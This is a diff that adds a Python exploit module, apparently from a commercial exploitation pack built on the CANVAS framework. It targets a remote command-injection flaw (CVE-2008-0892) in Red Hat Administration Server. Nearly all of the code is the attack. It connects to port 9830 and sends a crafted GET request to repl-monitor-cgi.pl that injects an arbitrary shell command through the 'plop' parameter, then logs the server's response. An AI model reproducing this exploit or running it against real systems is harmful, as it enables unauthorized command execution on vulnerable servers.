@@ -1,0 +1,100 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+import sys
+import random
+import time
+import thread
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from libs.spkproxy import header, body
+from libs.canvasos import *
+
+import struct
+import canvasengine
+
+# GUI info
+NAME = "RedHat Administration Server Exploit"
+
+DESCRIPTION = "Remote command vulnerability in RedHat Administration Server"
+DOCUMENTATION = {}
+DOCUMENTATION["Date public"] = "2008.04.15"
+DOCUMENTATION["VersionsAffected"] = "Red Hat Directory Server 8.0 EL4 and EL5"
+DOCUMENTATION["CVE Name"] = "CVE-2008-0892"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0892"
+DOCUMENTATION["Notes"] = """
+This vulnerability is also on Fedora 7 and Fedora 8 with Fedora
+Directory Server (http://directory.fedoraproject.org/)
+"""
+
+VERSION = "0.1"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"] ]
+
+class theexploit(tcpexploit):
+	def __init__(self):
+		tcpexploit.__init__(self)
+		self.setInfo(DESCRIPTION)
+		self.name = NAME       
+		self.port = 9830 
+		self.cmd = "id"
+		return
+
+	def run(self):
+		self.host = self.target.interface
+		self.port = int(self.argsDict.get("port", self.port))
+		self.cmd = self.argsDict.get("cmd", self.cmd)
+
+		self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))                
+		self.log("Attacking %s:%d"%(self.host, self.port))                
+        
+		s = self.gettcpsock()
+        
+		try:
+			s.connect((self.host, self.port))                        
+		except:
+			self.log('Could not connect to port %s:%s'%(self.host,self.port))
+			return 0
+
+		req = "GET /dist/repl-monitor-cgi.pl?admurl=d2sec&plop=\";%s\" HTTP/1.0\n\n" % self.cmd
+		s.sendall(req)                  
+       	
+		buf = ""
+		while 1:
+			b = s.recv(1024)
+			if len(b) > 0:
+				buf += b
+			else:
+				break
+		
+		self.log("%s" % buf)
+		s.close()
+        
+		self.setInfo("%s attacking %s:%d (succeeded !)"%(NAME, self.host, self.port))                
+		self.log("%s done (succeeded!)" % self.name)
+
+		return 0            
+        		
+	def usage(self):        
+		print "Usage: %s -t targethost -p port -O cmd:command\n" % sys.argv[0]
+		sys.exit(0) 
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
